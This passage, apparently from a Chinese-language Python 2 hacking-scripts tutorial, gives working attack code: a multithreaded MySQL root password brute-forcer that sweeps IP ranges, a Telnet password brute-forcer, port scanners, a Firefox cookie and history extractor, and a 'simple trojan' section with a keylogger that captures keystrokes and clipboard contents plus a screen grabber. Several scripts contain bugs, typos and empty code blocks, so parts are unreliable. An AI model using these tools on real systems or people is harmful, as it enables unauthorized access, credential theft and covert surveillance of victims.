        print '[!] Path Does Not Exist: ' + pathName
        exit(0)
    else:
        downloadDB = os.path.join(pathName, 'downloads.sqlite')
        if os.path.isfile(downloadDB):
            printDownloads(downloadDB)
        else:
            print '[!] Downloads DB Does Not Exist: ' + downloadDB
        cookiesDB = os.path.join(pathName,'cookies.sqlite')
        if os.path.isfile(cookiesDB):
            printCookies(cookiesDB)
        else:
            print '[!] Cookies DB Does Not Exist: ' + cookiesDB
        placesDB = os.path.join(pathName, 'places.sqlite')
        if os.path.isfile(placesDB):
            printHistory(placesDB)
            printGoogle(placesDB)
        else:
            print '[!] Places DB Does Not Exist: ' + placesDB

if __name__ == '__main__':
    main()
```
{% endtab %}
{% endtabs %}



## 10、解析TTL字段值

{% tabs %}
{% tab title="打印TTL值" %}
```python
# -*- coding: utf-8 -*-

from scapy.all import * # 使用scapy库

def testTTL(pkt):
    try:
        if pkt.haslayer(IP):    
            ipsrc = pkt.getlayer(IP).src    #判断pkt中是否有IP地址
            ttl = str(pkt.ttl)  # 提取UO地址与TTL并打印出来
            print '[+] Pkt Received From: ' + ipsrc + 'with TTL: ' + ttl
    except:
        pass

def main():
    sniff(prn=testTTL,store=0)  # 嗅探

if __name__ == '__main__':
    main()
```
{% endtab %}

{% tab title="判断返回值" %}
```python
# -*- coding: utf-8 -*-

from scapy.all import * # 使用scapy库
from IPy import IP as IPTEST    # 导入相关库并重新命名

ttlValues = {}  # TTL值
THRESH = 5  # 中继跳

def checkTTL(ipsrc,ttl):
    if IPTEST(ipsrc).iptype() == 'PRIVATE': # 判断返回值
        return 
    if not ttlValues.has_key(ipsrc):
        pkt = srl(IP(dst=ipsrc)/ICMP(),retry=0,timeout=1,verbose=0)
        ttlValues[ipsrc] = pkt.ttl
    if abs(int(ttl) - int(ttlValues[ipsrc])) > THRESH:
        print '\n[!] Detected Possible Spoofed Packet From: ' + ipsrc
        print '[!] TTL: ' + ttl + ', Actual TTL: ' + str(ttlValues[ipsrc])

```
{% endtab %}

{% tab title="代码整合" %}
```python
# -*- coding: utf-8 -*-

import optparse
from scapy.all import * # 使用scapy库
from IPy import IP as IPTEST    # 导入相关库并重新命名

ttlValues = {}  # TTL值
THRESH = 5  # 中继跳

def checkTTL(ipsrc,ttl):
    if IPTEST(ipsrc).iptype() == 'PRIVATE': # 判断返回值
        return
    if not ttlValues.has_key(ipsrc):
        pkt = srl(IP(dst=ipsrc)/ICMP(),retry=0,timeout=1,verbose=0)
        ttlValues[ipsrc] = pkt.ttl
    if abs(int(ttl) - int(ttlValues[ipsrc])) > THRESH:
        print '\n[!] Detected Possible Spoofed Packet From: ' + ipsrc
        print '[!] TTL: ' + ttl + ', Actual TTL: ' + str(ttlValues[ipsrc])

def testTTL(pkt):
    try:
        if pkt.haslayer(IP):
            ipsrc = pkt.getlayer(IP).src    #判断pkt中是否有IP地址
            ttl = str(pkt.ttl)  # 提取UO地址与TTL并打印出来
            print '[+] Pkt Received From: ' + ipsrc + 'with TTL: ' + ttl
    except:
        pass

def main():
    parser = optparse.OptionParser("usage %prog" + "-i <interce> -t <tresh>")
    parser.add_option('-i',dest='iface',type='string',help='specify network interface')
    parser.add_option('-t', dest='thresh', type='int', help='specify threshold count')
    (options, args) = parser.parse_args()
    if options.iface == None:
        conf.iface = 'eth0'
    else:
        conf.iface = options.iface
    if options.tresh != None:
        THRESH = options.thresh
    else:
        THRESH = 5
    try:
        sniff(prn=testTTL,store=0)  # 嗅探
    except Exception,e:
        print e

if __name__ == '__main__':
    main()
```
{% endtab %}
{% endtabs %}

## 11、用anonBrowser抓取web页面

{% tabs %}
{% tab title=" anonBrowser 类库" %}
```python

```
{% endtab %}

{% tab title="解析页面" %}
```python

```
{% endtab %}

{% tab title="下载目标站点图片" %}
```python

```
{% endtab %}
{% endtabs %}

## 12、多线程爆破mysql

```python
# -*- coding: utf-8 -*-

import threading
import argparse
import socket
import Queue
import netaddr
import MySQLdb
import time
import sys

class Mysqlfuzz:

    def __init__(self,addr,tnum):
        self.scanque = Queue.Queue()
        self.tnum = tnum
        self.tmpnum = tnum
        self.lock = threading.Lock()
        self.openlist = []
        if addr.find("-") != -1:     #ip地址识别
            for ip in netaddr.IPRange(addr.split("-")[0],addr.split("-")[1]):
                self.scanque.put(ip)
        else:
            for ip in netaddr.IPNetwork(addr).iter_hosts():
                self.scanque.put(ip)
        self.qsize = self.scanque.qsize() #队列大小
        for i in range(tnum): #开启线程
            t = threading.Thread(target=self.ScanPort)
            t.setDaemon(True)
            t.start()
        while self.tmpnum > 0:
            time.sleep(1.0)
        print "[*]:cracking MySQL Password ..."
        with open("pass.txt","r") as file: #读取字典
            data = file.readlines()
        for ip in self.openlist: #逐条尝试密码
            for line in data:
                self.scanque.put(line.strip())
            for i in range(tnum):
                t = threading.Thread(target=self.Crack,args=(ip,))
                t.setDaemon(True)
                t.start()
            while self.scanque.qsize() > 0:
                time.sleep(1.0)

    def Crack(self,ip): #连接目标MySQL数据库
        while self.scanque.qsize() > 0:
            try:
                password = self.scanque.get()
                conn = MySQLdb.connect(host=ip, user='root', passwd=password, db='test', port=3306, connect_timeout=4)
                self.lock.acquire()
                msg = "[+]:%s Username: root Password is: %s" % (ip, password)
                print msg
                output = open('good.txt', 'a')
                output.write(msg + "\r\n")
                self.lock.release()
                break
            except:
                pass

    def ScanPort(self):  # 查看目标3306端口状态
        while self.scanque.qsize() > 0:
            try:
                ip = self.scanque.get()
                s = socket.socket()
                s.settimeout(4)
                s.connect((str(ip), 3306))
                self.lock.acquire()
                print ip, " 3306 open"
                self.openlist.append(str(ip))
                self.lock.release()
            except:
                pass
        self.tmpnum -= 1

if __name__ == "__main__":  # 获取命令行参数并开始尝试暴力破解
    parse = argparse.ArgumentParser(description="mysqlfuzz")
    parse.add_argument('-a', '--addr', type=str, help="ipaddress")
    parse.add_argument('-t', '--thread', type=int, help="ThreadNumber",default=100)
    args = parse.parse_args()
    if not args.addr:
        parse.print_help()
        sys.exit(0)
    addr = args.addr
    tnum = args.thread

Mysqlfuzz(addr, tnum)
```

## 13、IP段端口扫描

{% tabs %}
{% tab title="UI界面与扫描函数" %}
```python
# -*- coding: utf-8 -*-

from PyQt4 import Qtcore,QtGui
import sys
import socket
import threading,time
import thread
import ini
import time # 获取时间和延时

socket.setdefaulttimeout(10)    # 设置全局默认超过时间

try:
    _fromUtf8 = Qtcore.Qstring.fromUtf8
except AttributeError:
    _fromUtf8 = lambda s: s

class Ui_Form(object):

    def setupUi(self,Form):
        Form.setObjectName(_fromUtf8("Form"))
        Form.resize(272, 482)
        self.textEdit = QtGui.QTextEdit(Form)
        self.textEdit.setGeometry(QtCore.QRect(60, 10, 201, 31))
        self.textEdit.setObjectName(_fromUtf8("textEdit"))
        self.textEdit_2 = QtGui.QTextEdit(Form)
        self.textEdit_2.setGeometry(QtCore.QRect(60, 50, 201, 31))
        self.textEdit_2.setObjectName(_fromUtf8("textEdit_2"))
        self.textEdit_3 = QtGui.QTextEdit(Form)
        self.textEdit_3.setGeometry(QtCore.QRect(60, 90, 81, 31))
        self.textEdit_3.setObjectName(_fromUtf8("textEdit_3"))
        self.label = QtGui.QLabel(Form)
        self.label.setGeometry(QtCore.QRect(10, 30, 54, 12))
        self.label.setObjectName(_fromUtf8("label"))
        self.label_2 = QtGui.QLabel(Form)
        self.label_2.setGeometry(QtCore.QRect(10, 70, 54, 12))
        self.label_2.setObjectName(_fromUtf8("label_2"))
        self.label_3 = QtGui.QLabel(Form)
        self.label_3.setGeometry(QtCore.QRect(20, 110, 54, 12))
        self.label_3.setObjectName(_fromUtf8("label_3"))
        self.pushButton = QtGui.QPushButton(Form)
        self.pushButton.setGeometry(QtCore.QRect(160, 90, 101, 31))
        self.pushButton.setObjectName(_fromUtf8("pushButton"))
        self.textEdit_4 = QtGui.QTextEdit(Form)
        self.textEdit_4.setGeometry(QtCore.QRect(10, 150, 251, 321))
        self.textEdit_4.setObjectName(_fromUtf8("textEdit_4"))
        self.label_4 = QtGui.QLabel(Form)
        self.label_4.setGeometry(QtCore.QRect(70, 130, 251, 25))
        self.label_4.setObjectName(_fromUtf8("label_4"))
        self.retranslateUi(Form)
        QtCore.QMetaObject.connectSlotsByName(Form)
        QtCore.QObject.connect(self.pushButton, QtCore.SIGNAL(_fromUtf8("clicked()")), self.test)

    def test(self):
        thread.start_new_thread(self.mess, ())

    def mess(self):
        ip1 = self.textEdit.toPlainText()  # 获取内容
        ip2 = self.textEdit_2.toPlainText()  # 获取内容
        port = self.textEdit_3.toPlainText()  # 获取内容
        ini.ini_write(ip1, ip2, port)  # 修改INI
        self.textEdit_4.append(u"扫描结果会保存在程序目录下ip.txt")
        list_ip = self.gen_ip(self.ip2num(ip1), self.ip2num(ip2))
        self.pushButton.setEnabled(0)  # 将按钮改成禁用
        self.textEdit_4.append(u"需要扫描" + str(len(list_ip)) + u"个IP")
        I1 = 0  # 得到list的第一个元素
        ip = 0
        self.textEdit_4.append(u"开始扫描IP--" + time.strftime('%Y.%m.%d-%H. %M. %S'))
        while I1 < len(list_ip):
            if ip >= 200:
                ini.ini_write(list_ip[I1], ini.IP2, port)  # 修改INI
        ip = 0
        print list_ip[I1]
        ip = ip + 1
        time.sleep(0.1)  # 确保先运行Seeker中的方法

        thread.start_new_thread(self.socket_port, (list_ip[I1], int(port)))
        I1 = I1 + 1  # 一层
        self.textEdit_4.append(u"IP扫描完成--" + time.strftime('%Y.%m.%d-%H.%M.%S'))
        self.pushButton.setEnabled(1)  # 将按钮改成可用

    def socket_port(self,ip,PORT):
        try:
            self.label_4.setText(U"正在扫描IP:"+str(ip)+u":"+str(PORT))
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,PORT))
            self.textEdit_4.append(str(ip)+u":"+str(PORT)+u"端口开放")
            xxx=file('ip.txt','w')
            xxx.write(str(ip))
            xxx.write('\n')
            xxx.close()
        except:
            print ip, u":", PORT, u"端口未开放"
    def ip2num(self,ip):
        ip = [int(x) for x in ip.split('.')]
        return ip[0]<<24 | ip[1]<<16 | ip[2]<<8 | ip[3]

    def num2ip(self,num):
         if num>=IPend:
         self.textEdit_4.append(u"IP导入数组完成")
         return '%s.%s.%s.%s' % ( (num & 0xff000000) >> 24,(num & 0x00ff0000) >> 16,(num & 0x0000ff00) >> 8,num & 0x000000ff)

    def gen_ip(self,Aip1,Aip2): #返回数组
         global IPend
         IPend=Aip2
         return [self.num2ip(num) for num in range(Aip1,Aip2+1) if num & 0xff]

    def iniA(self):
        ini.ini_get()  # 读取INI
        self.textEdit.setPlainText(ini.IP1)
        self.textEdit_2.setPlainText(ini.IP2)
        self.textEdit_3.setPlainText(ini.port)

    def retranslateUi(self, Form):
        Form.setWindowTitle(QtGui.QApplication.translate("Form","Simple", None, QtGui.QApplication.UnicodeUTF8))
        self.label.setText(QtGui.QApplication.translate("Form", "开始IP：", None, QtGui.QApplication.UnicodeUTF8))
        self.label_2.setText(QtGui.QApplication.translate("Form", "结束IP：", None, QtGui.QApplication.UnicodeUTF8))
        self.label_3.setText(QtGui.QApplication.translate("Form", "端口：", None, QtGui.QApplication.UnicodeUTF8))
        self.pushButton.setText(QtGui.QApplication.translate("Form", "开始扫描", None, QtGui.QApplication.UnicodeUTF8))
        self.label_4.setText(QtGui.QApplication.translate("Form", "扫描结果", None, QtGui.QApplication.UnicodeUTF8))

class Start(QtGui.QMainWindow):

    def __init__(self,parent=None):
        QtGui.QWidget.__init__(self,parent)
        self.ui=Ui_Form()
        self.ui.setupUi(self)
        self.ui.iniA()

if __name__ == '__main__':
    app = QtGui.QApplication(sys.argv)
    myapp = Start()
    myapp.show()
    sys.exit(app.exec_())
```
{% endtab %}

{% tab title="ini.py" %}
```python
# -*- coding: utf-8 -*-

IP1 = ""    #扫描IP
IP2 = ""    #当前已经扫到的IP
port = ""   #扫描端口
INITXT = "IP.ini"   # INI文件名字

import ConfigParser

def ini_get():  # 读取INI
    try:
        global IP1
        global IP2
        global port
        global INITXT
        config = ConfigParser.ConfigParser()
        config.readfp(open(INITXT))
        IP1 = config.get("ipdata","ip1")
        IP2 = config.get("ipdata","ip2")
        port = config.get("ipdata","port")
    except:
        print "读取INI错误"
        ini_add("","","")   # 写入INI

def ini_add(ip1,ip2,pt):# 写入INI
    try:
        global INITXT
        config = ConfigParser.ConfigParser()
        config.add_section("ipdata")    # 设置section段及对应的值
        config.set("ipdata","ip1",ip1)
        config.set("ipdata", "ip2", ip2)
        config.set("ipdata", "pt", pt)
        config.write(open(INITXT,"w"))  # 写入文件
    except:
        print "写入INI错误"

def ini_write(ip1,ip2,pt):  #修改INI
    try:
        global INITXT
        config = ConfigParser.ConfigParser()
        config.read(INITXT)
        if not config.has_section("ipdata"):    #看是否存在该Section，不存在则创建
            temp = config.add_section("")
        config.set("ipdata","ip1",ip1)
        config.set("ipdata", "ip2", ip2)
        config.set("ipdata", "pt", pt)
        config.write(open(INITXT,"r+"))
    except:
        print "修改INI错误"
        ini_add("","")  # 写入INI
```
{% endtab %}
{% endtabs %}

## 14、TCP端口扫描

{% tabs %}
{% tab title="简易脚本" %}
```python
# -*- coding: utf-8 -*-

from socket import *

# 简单扫描
def PortScanner(host,port):
    try:
        s = socket(AF_INET,SOCK_STREAM)
        s.connect((host,port))
        print("[+] %d open" % port)
        s.close()
    except:
        print("[-] %d close" % port)
def main():
    setdefaulttimeout(1)
    for p in range(20,100):
        PortScanner('192.168.1.3',p)
if __name__ == '__main__':
    main()
```
{% endtab %}

{% tab title="创建线程" %}
```python
# -*- coding: utf-8 -*-

from socket import *
import threading

lock = threading.Lock()
openNum = 0
threads = []

# 简单扫描
def PortScanner(host,port):
    global openNum
    try:
        s = socket(AF_INET,SOCK_STREAM)
        s.connect((host,port))
        lock.acquire()      #所定成员
        openNum += 1
        print("[+] %d open" % port)
        lock.release()  #解锁
        s.close()
    except:
        pass

def main():
    setdefaulttimeout(1)
    for p in range(1,1024):     #端口范围
        t = threading.Thread(target=PortScanner,args=('192.168.1.3',p))
        threads.append(t)   #创建threads数据
        t.start()
    for t in threads:
        t.join()
    print("[*] The scan is complete!")
    print("[*] a total of %d open port" % (openNum))

if __name__ == '__main__':
    main()
```
{% endtab %}
{% endtabs %}

## 15、Telnet密码爆破

```python
# -*- coding: utf-8 -*-

import telnetlib
import time
import sys
import os

def do_telnet(Host, Port, username, passowrd, finish):
    # 链接Telnet服务器
    tn = telnetlib.Telnet(Host, Port, timeout=1)
    tn.set_debuglevel(3)
    # 输入登录用户名
    tn.read_until("login: ")
    tn.write(str(username)+'\n')
    # 输入登录密码
    tn.read_until("Password: ")
    tn.write(str(passowrd) + '\n')
    # 判断密码错误提示，如果没有提示说明登录成功
    if tn.read_until(finish):
        print "[-]Login Failed\n"
    tn.close()

if __name__ == '__main__':
    Host = raw_input("IP:")     # talent服务器IP
    Port = raw_input("Port:")   # Telnet服务器端口
    username = 'root'           # 登录用户名
    finish = 'incorrect'        # 密码错误提示
    pw_file = open('pass.txt','r') # 密码文件
    Index = 0
    print time.asctime(),": begin","\n"
    while True:
        password = pw_file.readline()
        Index += 1
        print Index,time.asctime(),"Try","",username,":",password,""
        if len(password) == 0:
            break
        do_telnet(Host, Port, username, password, finish)
    pw_file.close()
```

## 16、简易木马程序

{% tabs %}
{% tab title="键盘记录" %}
```python
# -*- coding: utf-8 -*-

from ctypes import *
import pyHook
import win32clipboard

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

def get_current_process():
    # 获取最上层的窗口句柄
    hwnd = user32.GetForegroundWindow()

    # 获取进程ID
    pid = c_ulong(0)
    user32.GetwindowThreadProcessId(hwnd,byref(pid))

    # 将进程ID存入变量中
    process_id = "%d" % pid.value

    # 申请内存
    executable = create_string_buffer("\0x00"*512)
    h_process = kernel32.OpenProcess(0x400 | 0x10,False,pid)

    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)

    # 读取窗口标题
    windows_title = create_string_buffer("\0x00"*512)
    length = user32.GetwindowTextA(hwnd,byref(windows_title),512)

    # 打印
    print
    print "[ PID: %s-%s-%s ]" % (process_id,executable.value,windows_title.value)
    print

    # 关闭handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)

# 定义击键监听事件函数
def KeyStroke(event):
    global current_window

    # 检测目标窗口是否转移（换了其他窗口就监听新的窗口）
    if event.WindowName != current_window:
        current_window = event.WindowName

        # 函数调用
        get_current_process()

    # 检测击键是否常规按键（非组合键等）
    if event.Ascii > 32 and event.Ascii < 127 :
        print chr(event.Ascii)
    else:
        # 如果发现Ctrl+v（粘贴）事件，就把查娜铁板内容记录下来
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            print "[PASTE]-%s" % (pasted_value),
        else:
            print "[%s]" % event.Key

    # 循环监听下一个击键事件
    return True

# 创建并注册hook管理器
k1 = pyHook.HookManager()
k1.KeyDown = KeyStroke

# 注册hook并执行
k1.HookKeyboard()
pythoncom.PumpMessages()

```
{% endtab %}

{% tab title="屏幕截图" %}
```python
# -*- coding: utf-8 -*-

import win32gui
import win32ui
import win32con
import win32api

# 获取桌面
hdesktop = win32gui.GetDesktopWindow()

# 分辨率适应
width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
left = win32api.GetSystemMetrics(win32con.SM_XVVIRTUALSCREEN)
top = win32api.GetSystemMetrics(win32con.SM_YVVIRTUALSCREEN)

# 创建设备描述表
desktop_dc = win32gui.GetWindowDC(hdesktop)
img_dc = win32ui.CreateDCFromHandle(desktop_dc)

# 创建一个内存设备描述表
mem_dc = img_dc.CreateCompatibleDC()

# 创建位图对象
screenshot = win32ui.CreateBitmap()
screenshot.CreateCompatibleBitmap(img_dc,width,height)
mem_dc.SelectObject(screenshot)

# 截图至内存设备描述表
mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)

# 将截图保存到文件
screenshot.SaveBitmapFile(mem_dc,'C:\\Users\\Administrator\\Desktop\\Screenshots.bmp')

# 内存释放
mem_dc.DeleteDC()
win32gui.DeleteObject(screenshot.Gethandle())

```
{% endtab %}
{% endtabs %}



